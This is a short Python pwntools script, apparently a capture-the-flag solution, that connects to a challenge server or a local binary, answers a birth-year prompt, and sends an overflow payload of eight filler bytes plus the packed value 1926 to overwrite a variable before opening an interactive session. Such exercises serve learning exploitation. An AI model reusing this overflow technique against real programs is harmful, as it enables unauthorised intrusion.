from pwn import *

if args['REMOTE']:
	r=remote('ctf.acdxvfsvd.net',1926)
else:
	r=process('./test')

r.sendlineafter('Birth?\n','2000')

payload='a'*8+p64(1926)

r.sendlineafter('Name?\n',payload)

r.interactive()
